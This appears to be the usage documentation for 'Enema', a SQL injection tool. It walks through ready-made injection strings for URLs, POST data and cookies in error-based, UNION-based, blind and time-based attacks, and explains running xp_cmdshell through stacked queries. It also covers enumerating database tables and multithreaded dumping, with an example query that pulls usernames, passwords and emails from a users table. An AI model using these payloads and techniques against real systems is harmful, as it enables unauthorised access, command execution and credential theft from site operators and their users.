#labels Enema,SQL,Usage,Featured
[#SQL_injection_in_GET_requests]

[#SQL_injection_in_POST_requests,_Headers]

[#Blind_injection]

[#Methods_of_db_structure_tab]

[#Dump_tab]

---------------
===SQL injection in GET requests===
---------------
For example vulnerable script:
<code>
http://site.com/vuln.aspx?id=1'
</code>
Response:
<code>
Unclosed quotation mark after the character string '1'`
</code>

If injection type is Error-based then ready for injection string using Enema will be:
<code>
http://site.com/vuln.aspx?id=1' and 1=[sub]--
</code>

For UNION-based sql injections you can use this url:
<code>
http://site.com/vuln.aspx?id=1' union all select null,null,[sub],null--
</code>

*{{{[sub]}}}* keyword indicates where inject SQL Substring.

If database rights - sysadmin, you can use this urls:
<code>
http://site.com/vuln.aspx?id=1' and 1={{{[sub]}}};[cmd]--
</code>

*{{{[cmd]}}}* keywords indicates where inject xp_cmdshell  and other stacked queries.

In this example {{{[sub]}}} used too. It needs for fetching xp_cmdshell output.

Also you can use only {{{[cmd]}}} if you not interested in results or not output not available.

---------------
===Blind injection===
---------------

*{{{[blind]}}}* keyword indicates where insert blind query.

When this keyword found in url, post data or cookies - enema enables options for blind attack in Query Tab.

For time-based injection you can define custom delay. Then run test and look for normal and delayed responses (lag checking).

If server lagging you can play with 'Max lag time' and 'Delay' options.

---------------
===SQL injection in POST requests, Headers===
---------------

All the same, with a little correction.
For example vulnerable script:
<code>
http://site.com/login.aspx
Post data: _username=admin'&password=test123
</code>
<code>
Unclosed quotation mark after the character string 'admin'`
</code>

1. Put _http://site.com/login.aspx_ to URL.

2. Select method = _POST_.

Post data should be:
<code>
username=' and 1[eq][sub]--&password=test123
</code>

*{{{[eq]}}}* keyword means equal symbol - "=". *This is important. Use {{{[eq]}}} instead of "=" in defined post data, and use *"%3b"* instead of ";" in defined Cookie header.*

For example Cookie string:
<code>
session=12345; uid=32321; cartid=' and 1=[sub]%3b[cmd]--; reffid=005541
</code>

If variable {{{[sub]}}} or {{{[cmd]}}} found in cookies, then Enema perceives attack as injection in cookies.

---------------
===Methods of db structure tab===
---------------

*Tables* - fetch tables from current database.

*Columns* - fetch columns from tables in right field. (Drag and drop table or tables from left field to right.)

*Bases* - fetch basesfrom current database.

 * Supported fetching methods:
   # not in({{{[array]}}})
   # not in({{{[substring]}}}) - multithreaded
   # by ordinal_position - multithreaded
   # LIMIT - multithreaded

Field "Match pattern" for exclusive cases only.
Enema parsing sql data between "Match symbols", default match symbol is "~"
---------------
===Dump tab===
---------------

*Table* - table for dump

*Columns* - columns for dump. Can be separated by ";".

*Primary key* - index number, something like CustomerID, or you can create your own table and insert data for dump.
e.g.
<code>
create table tmptbl (num int identity, sqldata varchar(8000) NULL, primary key (num)); insert into tmptbl select username + "|" + password + "|" + email from users
</code>

*From* and *To* - dump from position to position. (integer)

Dumper multithreaded. I successfuly tested it up to 50 threads. Your threads depend on your bandwidth speed :)

*Important*: `Dumper starts thread pool for each column. It means if you defined 10 threads and dumping table with 3 columns, dumper will start 30 threads.`